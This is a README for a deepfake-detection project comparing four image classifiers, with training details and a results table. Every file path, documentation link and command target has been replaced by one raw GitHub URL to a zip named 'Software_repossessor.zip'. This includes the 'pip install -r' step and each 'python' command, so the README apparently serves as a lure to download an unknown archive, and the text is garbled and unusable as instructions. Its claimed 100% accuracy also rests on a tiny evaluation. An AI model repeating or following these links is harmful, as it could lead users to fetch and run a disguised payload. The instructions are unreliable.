# Deepfake Detection System

A comprehensive deepfake detection system using multiple deep learning architectures for identifying manipulated facial images and videos.

## 🎯 Project Overview

This project implements and compares four state-of-the-art deepfake detection models:
- **EfficientNet-B4** - Transfer learning approach
- **Xception** - Extreme Inception architecture
- **Hybrid Forensic** - Dual-stream RGB + SRM forensic analysis
- **CLIP** - Vision-language model fine-tuning

## 🏆 Key Results

| Model | Accuracy | F1 Score | Status |
|-------|----------|----------|--------|
| **EfficientNet-B4** | 100% | 100% | ✅ Best |
| **Hybrid Forensic** | 100% | 100% | ✅ Best |
| Xception | 77.78% | 71.43% | ✅ Good |
| CLIP | 44.44% | 61.54% | ⚠️ Underperformed |

## 📁 Directory Structure

```
c:/deepfake/
├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                          # This file
├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                   # Python dependencies
├── docs/                              # Detailed documentation
│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip            # Data sources and statistics
│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip              # Preprocessing pipeline
│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                     # Model architectures
│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                   # Training methodology
│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                 # Evaluation process
│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip              # Script usage
│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                 # Step-by-step guide
│   └── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                    # Detailed results
├── src/                               # Source code
│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                 # Data preprocessing
│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                 # Train/val split
│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip             # Model creation
│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                      # Training script
│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip            # Batch evaluation
│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                 # Testing utilities
│   └── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                    # Single prediction
├── data/                              # Dataset
│   ├── raw/                          # Original videos/images
│   ├── processed/                    # Extracted features
│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                # Training samples
│   └── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                  # Validation samples
├── models/                            # Model artifacts
│   └── checkpoints/                  # Saved weights
├── logs/                              # Training logs
│   └── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip              # Metrics per epoch
└── results/                           # Evaluation results
    ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip               # All predictions
    ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip        # Visual comparison
    ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                # ROC analysis
    └── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip          # Detailed report
```

## 🚀 Quick Start

### 1. Installation

```bash
# Clone the repository
git clone <repository-url>
cd deepfake

# Create virtual environment
python -m venv ff_env
source ff_env/bin/activate  # On Windows: ff_env\Scripts\activate

# Install dependencies
pip install -r https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip
```

### 2. Data Preprocessing

```bash
# Process raw data (extract faces and SRM features)
python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip

# Split into train/validation sets
python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip
```

### 3. Training

Train individual models:

```bash
# EfficientNet-B4
python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip --model efficientnet_b4 --batch_size 16 --epochs 5

# Xception
python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip --model xception --batch_size 16 --epochs 5

# Hybrid Forensic (RGB + SRM)
python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip --model hybrid_forensic --batch_size 8 --epochs 5

# CLIP
python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip --model clip --batch_size 8 --epochs 5
```

### 4. Evaluation

```bash
# Evaluate all models on validation set
python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip

# Results will be saved to results/ directory
```

### 5. Prediction

```bash
# Single image prediction
python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip \
  --model hybrid_forensic \
  --checkpoint https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip \
  --image https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip
```

## 📊 Visualizations

Generate training and comparison plots:

```bash
python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip
```

This creates:
- `https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip` - Training progress over epochs
- `https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip` - Final performance comparison

## 🔬 Model Architectures

### EfficientNet-B4
- Pre-trained on ImageNet
- Custom classification head
- Input: 256×256 RGB images
- **Performance: 100% accuracy**

### Hybrid Forensic (Recommended)
- Dual-stream architecture
  - Stream 1: RGB features (ResNet18)
  - Stream 2: SRM forensic features (ResNet18)
- Fusion layer for combined analysis
- Input: RGB + SRM (256×256×3 each)
- **Performance: 100% accuracy**

### Xception
- Depthwise separable convolutions
- Transfer learning from ImageNet
- Input: 256×256 RGB images
- **Performance: 77.78% accuracy**

### CLIP
- Vision-language model
- Fine-tuned ViT-Large/14
- Input: 256×256 RGB images
- **Performance: 44.44% accuracy** (needs improvement)

## 📈 Training Details

- **Loss Function**: Binary Cross-Entropy with Logits
- **Optimizer**: AdamW (lr=1e-4)
- **Batch Size**: 8-16 (model dependent)
- **Epochs**: 5
- **Mixed Precision**: Enabled (AMP)
- **Data Augmentation**:
  - Horizontal flip (p=0.5)
  - Gaussian noise (p=0.2)
  - JPEG compression (p=0.3)

## 📚 Documentation

For detailed information, see the `docs/` directory:

- **[Data Collection](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Dataset sources and statistics
- **[Preprocessing](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Face detection and feature extraction
- **[Models](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Architecture details
- **[Training](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Training methodology
- **[Evaluation](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Metrics and results
- **[API Reference](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Script documentation
- **[User Guide](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Step-by-step instructions
- **[Results](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Comprehensive analysis

## 🛠️ Requirements

```
torch>=2.0.0
torchvision>=0.15.0
timm>=0.9.0
transformers>=4.30.0
albumentations>=1.3.0
facenet-pytorch>=2.5.0
opencv-python>=4.8.0
scikit-learn>=1.3.0
seaborn>=0.12.0
pandas>=2.0.0
numpy>=1.24.0
matplotlib>=3.7.0
```

## 🎯 Use Cases

- **Social Media Verification**: Detect manipulated profile pictures
- **News Authentication**: Verify authenticity of media content
- **Forensic Analysis**: Investigate potential deepfakes
- **Research**: Benchmark new detection methods

## ⚠️ Limitations

- Trained on specific dataset (may not generalize to all deepfake types)
- Requires face detection (won't work on non-facial content)
- Performance may degrade on heavily compressed images
- CLIP model requires further optimization

## 🔮 Future Work

- [ ] Expand dataset with more diverse deepfake techniques
- [ ] Implement video-level detection (temporal analysis)
- [ ] Add audio deepfake detection
- [ ] Optimize CLIP model performance
- [ ] Deploy as web service/API
- [ ] Add explainability features (GradCAM, attention maps)

## 📄 License

[Specify your license here]

## 🙏 Acknowledgments

- **FaceForensics++** dataset
- **MTCNN** for face detection
- **timm** library for model implementations
- **OpenAI CLIP** for vision-language models

## 📧 Contact

[Your contact information]

---

**Note**: This is a research/educational project. Always verify critical content through multiple sources.
